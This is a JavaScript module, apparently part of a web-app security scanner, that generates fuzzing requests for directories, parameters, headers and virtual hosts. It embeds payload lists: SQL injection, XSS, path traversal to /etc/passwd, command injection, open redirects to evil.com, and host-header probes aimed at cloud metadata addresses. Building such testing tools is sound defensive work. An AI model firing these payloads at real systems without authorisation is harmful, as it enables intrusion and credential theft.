'use strict';

/**
 * HECATE Webapp — Fuzzer
 * FFUF-inspired request generation for directory, parameter, and header fuzzing.
 *
 * The fuzzer generates request objects — the scanner's request engine sends them.
 * Pure generation functions; no I/O.
 *
 * Injection marker: FUZZ (can appear anywhere in URL, headers, or body).
 */

const wordlist  = require('../scanner/wordlist');
const { XSS_CANARY, REDIRECT_CANARY } = require('../checks/check-library');

const FUZZ = 'FUZZ';

// ── Mode: Directory fuzzing ───────────────────────────────────────────────────

/**
 * Generate directory fuzz requests for a base URL.
 * @param {string} baseUrl       - e.g. https://corp.com/
 * @param {object} opts
 * @param {string[]} opts.words  - custom wordlist (defaults to built-in)
 * @param {string[]} opts.extensions  - extensions to append (e.g. ['.php', '.bak'])
 * @param {string}   opts.method - HTTP method (default GET)
 * @returns {FuzzRequest[]}
 */
function dirFuzz(baseUrl, opts = {}) {
  const base      = baseUrl.replace(/\/$/, '');
  const words     = opts.words      ?? wordlist.DIRS;
  const exts      = opts.extensions ?? [''];
  const method    = opts.method     ?? 'GET';
  const requests  = [];

  for (const word of words) {
    for (const ext of exts) {
      const path = `${word}${ext}`;
      requests.push({
        method,
        url: `${base}/${path}`,
        headers:   opts.headers ?? {},
        fuzzTarget: 'directory',
        payload:    path,
      });
    }
  }

  return requests;
}

// ── Mode: Parameter fuzzing ───────────────────────────────────────────────────

/**
 * Generate parameter fuzz requests.
 * Tests each parameter with a set of injection payloads.
 * @param {string}   url          - base URL (params appended)
 * @param {string[]} params       - parameter names to fuzz
 * @param {object}   opts
 * @param {string[]} opts.payloads  - injection payloads
 * @param {string}   opts.method
 * @returns {FuzzRequest[]}
 */
function paramFuzz(url, params, opts = {}) {
  const payloads = opts.payloads ?? DEFAULT_PARAM_PAYLOADS;
  const method   = opts.method   ?? 'GET';
  const requests = [];

  for (const param of params) {
    for (const payload of payloads) {
      const u = new URL(url);
      u.searchParams.set(param, payload);
      requests.push({
        method,
        url: u.toString(),
        headers:    opts.headers ?? {},
        fuzzTarget: 'parameter',
        fuzzParam:  param,
        payload,
      });
    }
  }

  return requests;
}

// ── Mode: Header fuzzing ──────────────────────────────────────────────────────

/**
 * Generate header injection fuzz requests.
 * Tests Host header injection, X-Forwarded-For, etc.
 */
function headerFuzz(url, opts = {}) {
  const requests = [];
  const base     = { method: 'GET', url, headers: {}, fuzzTarget: 'header' };

  // Host header injection (SSRF / virtual host)
  for (const host of HOST_INJECTION_PAYLOADS) {
    requests.push({ ...base, headers: { host }, fuzzParam: 'Host', payload: host });
  }

  // X-Forwarded-For bypass
  for (const ip of ['127.0.0.1', '::1', '10.0.0.1', '192.168.0.1']) {
    requests.push({
      ...base,
      headers: { 'x-forwarded-for': ip, 'x-real-ip': ip },
      fuzzParam: 'X-Forwarded-For', payload: ip,
    });
  }

  return requests;
}

// ── Mode: Template fuzzing (FUZZ marker) ──────────────────────────────────────

/**
 * Generate fuzz requests from a template URL/headers containing FUZZ marker.
 * @param {string}   template    - URL template with FUZZ marker
 * @param {string[]} words       - replacement words
 * @param {object}   opts
 */
function templateFuzz(template, words, opts = {}) {
  return words.map(word => ({
    method:     opts.method   ?? 'GET',
    url:        template.replace(FUZZ, encodeURIComponent(word)),
    headers:    opts.headers  ?? {},
    fuzzTarget: 'template',
    payload:    word,
  }));
}

// ── Mode: Virtual host / subdomain fuzzing ────────────────────────────────────

/**
 * Generate virtual host fuzz requests.
 * Changes the Host header for each subdomain candidate.
 * @param {string}   url         - target IP or base URL
 * @param {string}   baseDomain  - domain to prepend subdomains to
 * @param {string[]} subs        - subdomain wordlist
 */
function vhostFuzz(url, baseDomain, subs = wordlist.SUBDOMAINS) {
  return subs.map(sub => ({
    method:     'GET',
    url,
    headers:    { host: `${sub}.${baseDomain}` },
    fuzzTarget: 'vhost',
    fuzzParam:  'Host',
    payload:    `${sub}.${baseDomain}`,
  }));
}

// ── Payload sets ──────────────────────────────────────────────────────────────

const DEFAULT_PARAM_PAYLOADS = [
  // SQLi
  "'", "''", "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--",
  "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1",
  "1; SELECT SLEEP(5)--",

  // XSS
  XSS_CANARY,
  '<script>alert(1)</script>',
  '"><script>alert(1)</script>',

  // LFI
  '../etc/passwd', '../../etc/passwd', '../../../etc/passwd',
  '....//....//etc/passwd', '%2e%2e%2fetc%2fpasswd',
  '..\\..\\..\\windows\\win.ini',

  // Open redirect
  REDIRECT_CANARY,
  '//evil.com', '///evil.com', '/\\evil.com',

  // SSTI (Server-side template injection)
  '{{7*7}}', '${7*7}', '<%= 7*7 %>',

  // Command injection
  '; ls', '| ls', '`ls`', '$(ls)', '; sleep 5', '| sleep 5',

  // XXE (just the marker — actual payload in body for POST)
  '<!ENTITY',
];

const HOST_INJECTION_PAYLOADS = [
  'localhost',
  '127.0.0.1',
  '169.254.169.254',                           // AWS metadata
  '169.254.169.254/latest/meta-data/',
  'metadata.google.internal',                  // GCP metadata
  '100.100.100.200',                           // Alibaba metadata
  'hecate-host-injection.invalid',             // generic canary
];

/**
 * Determine if a fuzz response is a potential hit.
 * Filters out baseline 404/redirect responses.
 * @param {FuzzRequest}  req
 * @param {FuzzResponse} res
 * @param {object}       baseline   - { status, bodyLength }
 * @returns {boolean}
 */
function isHit(req, res, baseline) {
  if (!res) return false;
  if (res.status === 404) return false;
  if (res.status === 429) return false; // rate limited — not a finding

  // Flag anything that differs significantly from baseline
  if (baseline) {
    if (res.status !== baseline.status)               return true;
    const lenDiff = Math.abs((res.body?.length ?? 0) - baseline.bodyLength);
    if (lenDiff > 200)                                return true;
  }

  return res.status >= 200 && res.status < 400;
}

module.exports = {
  FUZZ, dirFuzz, paramFuzz, headerFuzz, templateFuzz, vhostFuzz,
  DEFAULT_PARAM_PAYLOADS, HOST_INJECTION_PAYLOADS, isHit,
};
